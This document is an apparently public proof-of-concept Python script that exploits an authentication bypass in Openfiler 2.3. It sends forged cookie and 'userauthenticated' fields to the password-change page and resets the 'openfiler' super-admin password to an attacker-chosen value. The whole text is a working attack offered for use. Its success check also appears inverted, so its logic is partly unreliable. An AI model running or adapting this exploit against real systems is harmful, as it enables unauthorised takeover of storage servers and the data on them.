Openfiler 2.3 (Auth Bypass) Remote Password Change Exploit
==========================================================


#Exploit code (PoC) for OpenFiler 2.3 (current)
#by just a nonroot user
#
import urllib,sys,re
#host example: https://192.168.20.5:446/
host=raw_input("OpenFiler system ( include http and /): ")
#Super admin user
user=&#039;openfiler&#039;
#What pass do you want?
password=&#039;nonroot&#039;
#use it please ;)
fake="myladyastridcita"
data= urllib.urlencode({&#039;current_password&#039;:fake , &#039;passcookie&#039;: fake, &#039;usercookie&#039;: user,&#039;new_password&#039;: password,&#039;confirm_new_password&#039;: password,&#039;userauthenticated&#039;:"666"})
response= urllib.urlopen(host+"account/password.html", data)
data=response.read()
lookup=re.compile("successfully").search
match=lookup(data)
if not  match:
    print "Ok, now go and login with user:", user, " and password: ", password, " in ",host
else:
    print "Exploit failed, sorry, go and find some new bug or check this code and fix it!"
    sys.exit(2)
sys.exit(0)



